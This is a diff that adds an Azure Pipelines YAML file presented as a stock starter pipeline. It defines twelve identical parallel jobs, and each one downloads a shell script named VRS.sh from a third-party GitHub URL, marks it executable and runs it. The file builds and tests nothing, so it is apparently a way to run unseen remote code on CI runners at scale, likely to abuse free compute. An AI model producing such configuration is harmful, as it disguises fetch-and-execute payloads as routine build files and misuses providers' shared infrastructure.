@@ -1,0 +1,59 @@
+# Starter pipeline
+# Start with a minimal pipeline that you can customize to build and deploy your code.
+# Add steps that build, run tests, deploy, and more:
+# https://aka.ms/yaml
+
+trigger:
+- main
+
+pool:
+  vmImage: ubuntu-latest
+
+jobs:
+- job: a
+  steps:
+  - script: wget https://raw.githubusercontent.com/yogi899/nabila/main/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+
+- job: b
+  steps:
+  - script: wget https://raw.githubusercontent.com/yogi899/nabila/main/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+
+- job: c
+  steps:
+  - script: wget https://raw.githubusercontent.com/yogi899/nabila/main/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+
+- job: d
+  steps:
+  - script: wget https://raw.githubusercontent.com/yogi899/nabila/main/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+  
+- job: e
+  steps:
+  - script: wget https://raw.githubusercontent.com/yogi899/nabila/main/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+  
+- job: f
+  steps:
+  - script: wget https://raw.githubusercontent.com/yogi899/nabila/main/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+  
+- job: g
+  steps:
+  - script: wget https://raw.githubusercontent.com/yogi899/nabila/main/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+  
+- job: h
+  steps:
+  - script: wget https://raw.githubusercontent.com/yogi899/nabila/main/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+  
+- job: i
+  steps:
+  - script: wget https://raw.githubusercontent.com/yogi899/nabila/main/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+  
+- job: j
+  steps:
+  - script: wget https://raw.githubusercontent.com/yogi899/nabila/main/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+  
+- job: k
+  steps:
+  - script: wget https://raw.githubusercontent.com/yogi899/nabila/main/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+  
+- job: l
+  steps:
+  - script: wget https://raw.githubusercontent.com/yogi899/nabila/main/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
